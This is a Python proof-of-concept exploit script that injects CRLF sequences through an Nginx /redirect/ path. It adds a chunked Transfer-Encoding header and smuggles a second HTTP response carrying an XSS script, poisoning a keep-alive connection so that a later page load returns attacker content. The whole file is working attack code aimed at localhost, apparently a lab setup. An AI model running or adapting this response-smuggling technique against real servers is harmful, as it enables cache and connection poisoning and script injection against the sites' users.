#!/usr/bin/env python3
"""
exploit_path.py — Path Injection Vector
Attacks /redirect/path/[payload]
Uses Transfer-Encoding: chunked to bypass Nginx's Content-Length.
"""
import socket, time, sys, urllib.parse

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 18000

def main():
    print("=" * 60)
    print("  CRLF Reverse Desync — Vector: Path Injection")
    print("  Bypass: Transfer-Encoding chunked to handle Nginx body")
    print("=" * 60)
    print()

    xss = '<script>alert("XSS via Reverse Desync + TE.Chunked Bypass")</script>'
    
    # The backend path is /redirect/ (Nginx will issue return 302 https://$host$uri)
    # Nginx will generate Content-Length: 145 and an HTML body.
    # We inject Transfer-Encoding: chunked to ignore Nginx's CL,
    # then a chunk size 0 to terminate the first response, and finally the second response.
    payload = (
        "\r\n"                        # Closes the Location header
        "Transfer-Encoding: chunked\r\n" # Ignores Nginx's Content-Length
        "\r\n"                        # End of first response headers
        "0\r\n"                       # Chunk size 0 (terminates the chunked body)
        "\r\n"                        # End of chunk
        "HTTP/1.1 200 OK\r\n"         # Start of second response (XSS)
        "Content-Type: text/html\r\n"
        f"Content-Length: {len(xss)}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{xss}"
    )
    
    encoded_payload = urllib.parse.quote(payload, safe='')
    path = "/redirect/" + encoded_payload
    
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode()

    print(f"[*] Sending poisoned request to {TARGET_HOST}:{TARGET_PORT}...")
    print(request)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET_HOST, TARGET_PORT))
        s.sendall(request)
        
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                data += chunk
                if b"\r\n\r\n" in data: break
        except socket.timeout: pass
        
        print(f"    Attacker response: {data[:100]}")
        print()
        print("=" * 60)
        print("  [+] POISONING COMPLETE!")
        print("=" * 60)
        print()
        print("  Open your browser NOW at this address:")
        print()
        print("  -> http://localhost:18000/api/profile")
        print()
        
        for i in range(30, 0, -1):
            print(f"\r  The script will close in {i} seconds...", end="", flush=True)
            time.sleep(1)
        
        s.close()
        print("\n\n  Time's up.")
    
    except Exception as e:
        print(f"\n  [!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()